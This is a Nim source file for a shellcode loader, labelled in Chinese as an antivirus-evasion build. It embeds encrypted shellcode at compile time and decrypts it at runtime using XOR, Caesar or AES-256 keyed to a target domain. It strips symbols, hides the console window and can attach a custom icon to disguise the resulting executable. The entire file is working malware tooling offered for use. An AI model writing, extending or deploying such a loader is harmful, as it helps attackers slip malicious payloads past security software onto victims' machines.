## Nim ShellCode Loader - 免杀版本
## 强制使用 XOR 加密

{.passL: "-static".}
{.passL: "-Wl,--no-insert-timestamp".}
{.passL: "-Wl,--strip-all".}
{.passL: "-s".}                    # strip 符号表
{.passL: "-mwindows".}             # GUI 模式（隐藏控制台）
{.passC: "-Os".}                   # 优化体积

import strutils

# ============================================================================
# 全局变量
# ============================================================================

const source {.strdefine.}: string = ""
var code* {.exportc.}: cstring
var codelen* {.exportc.}: cint = 0

# ============================================================================
# XOR 加密/解密
# ============================================================================

when defined(XOR):
    # 生成加密文件
    const encryptedFilePathRaw = staticExec(
            "nim r --hints:off ../encryption/Xor.nim " & source)
    const encryptedFilePath = block:
        let lines = encryptedFilePathRaw.splitLines()
        var result = ""
        for line in lines:
            let trimmed = line.strip()
            if trimmed.len > 0 and (trimmed.startsWith("C:\\") or
                    trimmed.startsWith("/")):
                result = trimmed
        result

    when encryptedFilePath == "":
        {.error: "Failed to generate XOR encrypted file. Output: " & encryptedFilePathRaw.}

    # 加载加密数据（编译时）
    const encryptedDataConst = staticRead(encryptedFilePath)

    # 运行时解密和初始化
    proc initXorShellcode() =
        # 计算payload长度
        let payloadLen = encryptedDataConst.len - 16

        # 分配内存并复制数据
        var buffer = newString(payloadLen)
        for i in 0..<payloadLen:
            buffer[i] = encryptedDataConst[16 + i]

        # 解密（直接操作buffer）
        let bufferPtr = cast[ptr UncheckedArray[byte]](addr buffer[0])
        for i in 0..<payloadLen:
            bufferPtr[i] = bufferPtr[i] xor encryptedDataConst[i mod 16].byte

        # 设置全局变量
        code = cstring(buffer)
        codelen = cast[cint](payloadLen)

    initXorShellcode()

# ============================================================================
# Caesar 解密
# ============================================================================

elif defined(Caesar):
    import sequtils

    # 生成加密文件
    const encryptedFilePathRaw = staticExec(
            "nim r --hints:off ../encryption/Caesar.nim " & source)
    const encryptedFilePath = encryptedFilePathRaw.splitLines()[^1].strip()

    # 加载加密数据
    const encryptedDataConst = staticRead(encryptedFilePath)

    proc initCaesarShellcode() =
        let encryptedData = encryptedDataConst
        let dictionary = encryptedData[0..255].mapIt(it.byte)
        let encryptedTable = encryptedData[256..high(encryptedData)].mapIt(it.byte)
        var temp: string = ""
        temp.setLen(encryptedTable.len)

        for round in 0..254:
            for idx in 0..high(encryptedTable):
                temp[idx] = cast[cchar](dictionary[encryptedTable[idx]])

        code = cstring(temp)
        codelen = cast[cint](encryptedTable.len)

    initCaesarShellcode()

# ============================================================================
# AES-256-CTR 解密
# ============================================================================

elif defined(AES):
    import nimcrypto

    # 生成加密文件
    const encryptedFilePathRaw = staticExec(
            "nim r --hints:off ../encryption/Aes256Ctr.nim " & source)
    const encryptedFilePath = encryptedFilePathRaw.splitLines()[^1].strip()

    # 加载加密数据
    const encryptedDataConst = staticRead(encryptedFilePath)

    proc initAesShellcode() =
        let encryptedData = encryptedDataConst
        const envKey: string = "TARGETDOMAIN"
        var
            dctx: CTR[aes256]
            key: array[aes256.sizeKey, byte]
            iv: array[aes256.sizeBlock, byte]

        for i in 0..15:
            iv[i] = encryptedData[i].byte

        let encryptedTextLen = encryptedData.len - 16
        var encryptedText = newSeq[byte](encryptedTextLen)
        var decryptedText = newSeq[byte](encryptedTextLen)

        for i in 0 ..< encryptedTextLen:
            encryptedText[i] = encryptedData[i + 16].byte

        var expandedKey = sha256.digest(envKey)
        copyMem(addr key[0], addr expandedKey.data[0], len(expandedKey.data))

        dctx.init(key, iv)
        dctx.decrypt(encryptedText, decryptedText)
        dctx.clear()

        code = cast[cstring](alloc0(encryptedTextLen))
        copyMem(code, addr decryptedText[0], encryptedTextLen)
        codelen = cast[cint](encryptedTextLen)

    initAesShellcode()

# ============================================================================
# 无加密（直接读取）
# ============================================================================

else:
    # 直接读取shellcode（未加密）
    const shellcodeDataConst = staticRead(source)

    proc initPlainShellcode() =
        var temp: string = shellcodeDataConst
        code = cstring(temp)
        codelen = cast[cint](shellcodeDataConst.len)

    initPlainShellcode()

# ============================================================================
# Windows 图标嵌入
# ============================================================================

when defined(gcc) and defined(windows) and defined(icoPath):
    import strformat, os
    const icoPath {.strdefine.}: string = ""

    static:
        const rcName = getTempDir() / "demo.rc"
        const iconObject = getTempDir() / "demo_icon.o"

        assert(icoPath != "", "Icon file path not set!")
        assert(fileExists(icoPath), &"Icon file does not exist: {icoPath}")

        const resourceText = &"1 ICON \"{icoPath}\""
        writeFile(rcName, resourceText)
        assert(fileExists(rcName), &"Failed to generate resource file: {rcName}")

        when defined(x86):
            {.link: "demo.res".}
        else:
            const windresCmd = "cmd /c \"windres -i " & rcName & " -o " & iconObject & "\""
            discard staticExec(windresCmd & " 2>&1")
            assert(fileExists(iconObject),
                   &"Failed to generate object file: {iconObject}\n" &
                   "Check: ICO format valid? windres in PATH?")
            {.link: iconObject.}
